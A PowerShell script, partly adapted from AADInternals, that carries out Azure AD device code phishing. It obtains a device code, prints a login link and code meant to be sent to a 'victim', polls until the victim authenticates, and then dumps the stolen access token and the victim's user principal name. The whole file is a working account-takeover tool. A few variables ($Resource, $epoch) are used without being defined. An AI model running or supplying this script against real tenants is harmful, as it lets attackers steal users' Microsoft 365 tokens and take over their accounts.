# Azure Device Code Auth Flow
# Some of the code here was taken from AADInternals (https://github.com/Gerenios/AADInternals/blob/master/KillChain.ps1)

############## Read-AccessToken function ####################
# Parse access token and return it as PS object
function Read-Accesstoken
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True,ValueFromPipeline)][String]$AccessToken,
        [Parameter()][Switch]$ShowDate,
        [Parameter()][Switch]$Validate
    )
    Process
    {
        # Token sections
        $sections =  $AccessToken.Split(".")
        if($sections.Count -eq 5)
        {
            Write-Warning "JWE token, expected JWS. Unable to parse."
            return
        }
        $header =    $sections[0]
        $payload =   $sections[1]
        $signature = $sections[2]

        # Convert the token to string and json
        $B64 = $payload.Replace("_","/").Replace("-","+").TrimEnd(0x00,"=")
        # Fill the header with padding for Base 64 decoding
        while ($B64.Length % 4){ $B64 += "=" }
        $payloadString = [text.encoding]::UTF8.GetString(([byte[]]([convert]::FromBase64String($B64))))
        $payloadObj=$payloadString | ConvertFrom-Json

        if($ShowDate)
        {
            # Show dates
            $payloadObj.exp=($epoch.Date.AddSeconds($payloadObj.exp)).toString("yyyy-MM-ddTHH:mm:ssZ").Replace(".",":")
            $payloadObj.iat=($epoch.Date.AddSeconds($payloadObj.iat)).toString("yyyy-MM-ddTHH:mm:ssZ").Replace(".",":")
            $payloadObj.nbf=($epoch.Date.AddSeconds($payloadObj.nbf)).toString("yyyy-MM-ddTHH:mm:ssZ").Replace(".",":")
        }

        if($Validate)
        {
            # Check the signature
            if((Is-AccessTokenValid -AccessToken $AccessToken))
            { Write-Verbose "Access Token signature successfully verified"}else{ Write-Error "Access Token signature could not be verified"}
            # Check the timestamp
            if((Is-AccessTokenExpired -AccessToken $AccessToken)){ Write-Error "Access Token is expired" }else{ Write-Verbose "Access Token is not expired" }
        }
        # Debug
        Write-Debug "PARSED ACCESS TOKEN: $($payloadObj | Out-String)"
        # Return
        $payloadObj
    }
}

###########################################################

$tenant = Read-Host "Please provide the TenantId"
$clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$body=@{
    "client_id" = $clientId
    "resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes
$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$tenant/oauth2/devicecode?api-version=1.0" -Body $body
# Loop (wait) until victim logged in to get access token
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication subsequent requests
$body=@{
    "client_id" =  $ClientId
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
    "resource" =   $Resource
}
Write-Host "Link for victim to initiate login: $($authResponse.verification_url)"
Write-Host "Code: $($authResponse.user_code)"

# Loop while authorisation pending or until timeout exceeded
while($continue)
{
    Start-Sleep -Seconds $interval
    $total += $interval
    if($total -gt $expires) { Write-Error "Timeout occurred"; return }
    # Try to get the response. Will give 400 while pending so we need to try&catch
    try
    {
        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
    }
    catch
    {
        # This normal flow, always returns 400 unless successful
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Verbose $details.error
        Write-Host "." -NoNewline
        if(!$continue)
        {
            # Not pending so this is a real error
            Write-Error $details.error_description
            return
        }
    }

    # If we got response, all okay!
    if($response)
    { Write-Host "";break }
}

# Dump the name
$user = (Read-Accesstoken -AccessToken $response.access_token).upn
if([String]::IsNullOrEmpty($user))
{
    $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
}
Write-Host "Received access token for $user`:`r`n$($response | ConvertTo-Json)"